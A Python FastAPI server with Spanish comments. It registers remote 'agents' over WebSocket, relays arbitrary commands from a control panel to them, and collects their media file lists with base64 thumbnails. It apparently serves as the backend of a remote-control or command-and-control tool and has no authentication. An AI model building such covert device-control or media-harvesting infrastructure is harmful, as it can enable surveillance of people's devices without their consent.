from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
import json

app = FastAPI()

# --- Diccionarios en memoria para guardar el estado ---
connected_agents: dict[str, dict] = {}
device_media_cache: dict[str, list] = {}

# --- Rutas de la API ---

@app.get("/api/get-agents")
async def get_agents():
    """Devuelve la lista de agentes conectados."""
    return [agent_data["details"] for agent_data in connected_agents.values() if "details" in agent_data]

@app.post("/api/send-command")
async def send_command(command: dict):
    """Recibe un comando del panel y lo reenvía al agente correcto."""
    target_id = command.get("target_id")
    if not target_id or target_id not in connected_agents:
        return {"status": "error", "message": "Agente no conectado"}
    try:
        await connected_agents[target_id]["ws"].send_text(json.dumps(command))
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": f"Fallo al enviar: {e}"}

# --- ¡NUEVA RUTA PARA RECIBIR MINIATURAS! ---
class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, media_list: list[Thumbnail]):
    """Ruta para que los agentes envíen la lista de sus archivos y miniaturas."""
    print(f"Recibida lista de medios ({len(media_list)} archivos) del dispositivo {device_id}")
    device_media_cache[device_id] = [item.dict() for item in media_list]
    return {"status": "success", "message": f"{len(media_list)} items recibidos."}

# --- ¡NUEVA RUTA PARA ENTREGAR MINIATURAS! ---
@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    """Ruta para que el panel de control pida la lista de medios de un dispositivo."""
    print(f"Panel de control pide la lista de medios para {device_id}")
    return device_media_cache.get(device_id, [])

# --- WebSocket Endpoint ---
@app.websocket("/ws/{device_id}/{device_name}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    """Punto de entrada para la conexión de los agentes."""
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: {device_name} (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "details": {"id": device_id, "name": device_name}}
    try:
        while True:
            await websocket.receive_text() # Mantiene la conexión viva
    except WebSocketDisconnect:
        print(f"[DESCONEXIÓN] Agente desconectado: {device_name}")
        if device_id in connected_agents:
            del connected_agents[device_id]
